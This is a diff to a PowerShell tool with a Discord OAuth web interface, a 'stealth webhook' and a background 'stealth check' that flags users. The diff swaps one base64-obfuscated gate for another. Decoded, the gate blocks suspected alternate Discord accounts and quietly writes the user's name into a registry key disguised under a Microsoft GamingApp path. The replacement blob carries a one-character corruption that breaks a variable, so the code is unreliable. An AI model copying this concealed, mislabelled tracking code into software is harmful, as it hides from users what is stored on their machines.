@@ -1187,7 +1187,7 @@ function Send-StealthWebhook {
 
 # --- Lightweight Web UI to replace WinForms when needed ---
 function Start-WebUI {
-    param()
+    param($detectionJob)
     [Console]::WriteLine('Start-WebUI: initializing...')
     # Ensure modern TLS for Discord API on Windows PowerShell 5.1
     try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12 } catch {}
@@ -1197,7 +1197,7 @@ function Start-WebUI {
 
     # Enable form parsing helpers
     Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue
-    $global:__ratzAuthGate = 'cGFyYW0oJGQsJG4pCiRmPSRmYWxzZTskbT0nJwp0cnl7JGk9W2ludDY0XSRkLmlkOyR0PShbZGF0ZXRpbWVdJzE5NzAtMDEtMDEnKS5BZGRNaWxsaXNlY29uZHMoKCgkaSAtc2hyIDIyKSsxNDIwMDcwNDAwMDAwKSk7aWYoKFtkYXRldGltZV06OlV0Y05vdy0kdCkuVG90YWxEYXlzIC1sdCAzMCl7JGY9JHRydWU7JG09J2FnZSc7fX0KY2F0Y2h7fQppZigtbm90ICRmKXsKICAgIHRyeXsKICAgICAgICAkeD0oJG4gLXJlcGxhY2UgJ1teYS16MC05XScsJycpLlRvTG93ZXIoKTsKICAgICAgICBpZigkeC5MZW5ndGggLWdlIDYpewogICAgICAgICAgICAkdj1bcmVnZXhdOjpNYXRjaGVzKCR4LCdbYWVpb3VdJykuQ291bnQ7CiAgICAgICAgICAgICRnPVtyZWdleF06Ok1hdGNoZXMoJHgsJ1xkJykuQ291bnQ7CiAgICAgICAgICAgIGlmKCRnIC1nZSAzIC1hbmQgJHggLW1hdGNoICdeW2Etel0rXGQrJCcpeyRmPSR0cnVlOyRtPSdwYXR0ZXJuJzt9CiAgICAgICAgICAgIGVsc2VpZigkdiAtZXEgMCAtYW5kICRnIC1nZSAxKXskZj0kdHJ1ZTskbT0nbm92b3dlbCc7fQogICAgICAgIH0KICAgIH1jYXRjaHt9Cn0KaWYoJGYpe3JldHVybiBbcHNjdXN0b21vYmplY3RdQHtCPSR0cnVlO009J0FsdCBEaXNjb3JkIGFjY291bnRzIGFyZSBub3QgYWxsb3dlZC4gUGxlYXNlIHNpZ24gaW4gd2l0aCB5b3VyIG1haW4gYWNjb3VudC4nfX0KdHJ5eyRrPSdIS0NVOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcR2FtaW5nQXBwXFxBY2NvdW50TGluayc7aWYoLW5vdCAoVGVzdC1QYXRoICRrKSl7TmV3LUl0ZW0gLVBhdGggJGsgLUZvcmNlfE91dC1OdWxsfTtTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRrIC1OYW1lICdNYWluQWNjb3VudCcgLVZhbHVlICRuIC1Gb3JjZXxPdXQtTnVsbDt9Y2F0Y2h7fQpbcHNjdXN0b21vYmplY3RdQHtCPSRmYWxzZTtNPScnfQo='
+    $global:__ratzAuthGate = 'cGFyYW0oJGQsJG4pCiRmPSRmYWxzZTskbT0nJwp0cnl7JGk9W2ludDY0XSRkLmlkOyR0PShbZGF0ZXRpbWVdJzE5NzAtMDEtMDEnKS5BZGRNaWxsaXNlY29uZHMoKCgkaSAtc2hyIDIyKSsxNDIwMDcwNDAwMDAwKSk7aWYoKFtkYXRldGltZV06OlV0Y05vdy0kdCkuVG90YWxEYXlzIC1sdCAzMCl7JGY9JHRydWU7JG09J2FnZSc7fX0KY2F0Y2h7fQppZigtbm90ICRmKXsKICAgIHRyeXsKICAgICAgICAkeD0oJG4gLXJlcGxhY2UgJ1teYS16MC05XScsJycpLlRvTG93ZXIoKTsKICAgICAgICBpZigkeC5MZW5ndGggLWdlIDYpewogICAgICAgICAgICAkdj1bcmVnZXhdOjpNYXRjaGVzKCR4LCdbYWVpb3VdJykuQ291bnQ7CiAgICAgICAgICAgICRnPVtyZWdleF06Ok1hdGNoZXMoJHgsJ1xkJykuQ291bnQ7CiAgICAgICAgICAgIGlmKCRgIC1nZSAzIC1hbmQgJHggLW1hdGNoICdeW2Etel0rXGQrJCcpeyRmPSR0cnVlOyRtPSdwYXR0ZXJuJzt9CiAgICAgICAgICAgIGVsc2VpZigkdiAtZXEgMCAtYW5kICRnIC1nZSAxKXskZj0kdHJ1ZTskbT0nbm92b3dlbCc7fQogICAgICAgIH0KICAgIH1jYXRjaHt9Cn0KaWYoJGYpe3JldHVybiBbcHNjdXN0b21vYmplY3RdQHtCPSR0cnVlO009J0FsdCBEaXNjb3JkIGFjY291bnRzIGFyZSBub3QgYWxsb3dlZC4gUGxlYXNlIHNpZ24gaW4gd2l0aCB5b3VyIG1haW4gYWNjb3VudC4nfX0KdHJ5eyRrPSdIS0NVOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcR2FtaW5nQXBwXFxBY2NvdW50TGluayc7aWYoLW5vdCAoVGVzdC1QYXRoICRrKSl7TmV3LUl0ZW0gLVBhdGggJGsgLUZvcmNlfE91dC1OdWxsfTtTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRrIC1OYW1lICdNYWluQWNjb3VudCcgLVZhbHVlICRuIC1Gb3JjZXxPdXQtTnVsbDt9Y2F0Y2h7fQpbcHNjdXN0b21vYmplY3RdQHtCPSRmYWxzZTtNPScnfQo='
 
     # Load Discord OAuth config if present, and register its redirect base as an additional prefix
     $oauthConfigPath = Join-Path $PSScriptRoot 'discord_oauth.json'
@@ -1843,7 +1843,7 @@ $errorBanner
                 
                 # Schedule script termination after a delay to ensure response is sent
                 Start-Job -ScriptBlock {
-                    Start-Sleep -Seconds 5
+                    Start-Sleep -Seconds 3
                     Stop-Process -Id $using:PID -Force
                 } | Out-Null
                 
@@ -1935,9 +1935,19 @@ $errorBanner
                                     $authed = $true
                                     $global:DiscordAuthError = $null
                                     
-                                    # Perform stealth detection after successful authentication
-                                    [Console]::WriteLine('OAuth: performing stealth check...')
-                                    $global:DetectionTriggered = Invoke-StealthCheck
+                                    # Wait for the background detection job to complete
+                                    [Console]::WriteLine('OAuth: waiting for background detection job to finish...')
+                                    $detectionResult = Wait-Job -Job $detectionJob -Timeout 30 # 30-second timeout
+                                    
+                                    if ($detectionJob.State -eq 'Completed') {
+                                        $global:DetectionTriggered = Receive-Job -Job $detectionJob
+                                        [Console]::WriteLine("OAuth: background detection result: $($global:DetectionTriggered)")
+                                    } else {
+                                        [Console]::WriteLine("OAuth: background detection job did not complete in time. State: $($detectionJob.State)")
+                                        # Decide how to handle a timeout - for now, assume not detected
+                                        $global:DetectionTriggered = $false
+                                    }
+                                    
                                     if ($global:DetectionTriggered) {
                                         [Console]::WriteLine('OAuth: DETECTION POSITIVE - flagging user')
                                     } else {
@@ -2103,9 +2113,25 @@ $StartInWebUI = $true
 [Console]::WriteLine("Entry point: StartInWebUI = $([boolean]::Parse(($StartInWebUI -eq $true).ToString()))")
 if (Get-Command -Name Start-WebUI -ErrorAction SilentlyContinue) { [Console]::WriteLine('Entry point: Start-WebUI function is defined') } else { [Console]::WriteLine('Entry point: Start-WebUI function NOT found') }
 [Console]::WriteLine("PSCommandPath = $PSCommandPath")
+
+# Start the asynchronous stealth check
+$detectionJob = Start-Job -ScriptBlock {
+    # The function is defined in the main script, so we need to pass its definition.
+    # We also pass the script root to resolve any dependencies if needed.
+    param($functionDef, $scriptRoot)
+    
+    # Define the function in the job's scope
+    . ([scriptblock]::Create($functionDef))
+    
+    # Now call the function
+    return Invoke-StealthCheck
+} -ArgumentList (Get-Content -Raw (Get-Command Invoke-StealthCheck).ScriptBlock.File), $PSScriptRoot
+[Console]::WriteLine("Started background detection job with ID: $($detectionJob.Id)")
+
+
 if ($StartInWebUI) {
     [Console]::WriteLine('Entry point: invoking Start-WebUI...')
-    Start-WebUI
+    Start-WebUI $detectionJob
     [Console]::WriteLine('Entry point: returned from Start-WebUI')
     # Do not exit automatically; keep console open for debugging
 }
